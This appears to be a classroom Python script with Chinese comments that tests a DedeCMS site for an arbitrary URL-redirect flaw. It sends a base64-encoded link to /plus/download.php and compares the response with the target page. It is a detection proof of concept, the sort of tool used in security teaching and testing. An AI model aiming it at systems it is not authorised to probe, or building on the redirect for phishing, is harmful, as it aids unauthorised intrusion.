#使用python完成对dedecms 任意url跳转漏洞的poc编写 11月28日 上午9:30-11:00
#python3

import base64
import requests
import urllib.parse
#poc，如果跳转成功返回1，如果跳转失败返回0
def UrlPoc(url):
    #对将要跳转的url做一个base64的编码处理
    link = "http://www.baidu.com"
    link = urllib.parse.unquote(link);
    link = str(base64.b64encode(link.encode("utf-8")), "utf-8")
    #url = "http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2-Full/uploads"

    #构造poc
    url = url + "/plus/download.php?open=1&link=" + link
    #发送请求，
    re=requests.get(url)
    #向将要跳转的链接的url发送请求
    bd=requests.get("http://www.baidu.com")
    #对比两个url返回结果，如果一样就是跳转成功，跳转成功返回1，如果跳转失败返回0
    if re.text == bd.text:
        return 1
    else:
        return 0

#输入要测试的网站的域名或ip
url=input("input your test weburl:<")
#调用函数
try:
    a=UrlPoc(url)
except:
    print("your input is error")
#判断是否有漏洞，如果返回结果为1,有漏洞，如果返回结果为0,没有漏洞
if a==1:
    print("dangers,cun zai lou dong")
else:
    print("safe,mei you lou dong")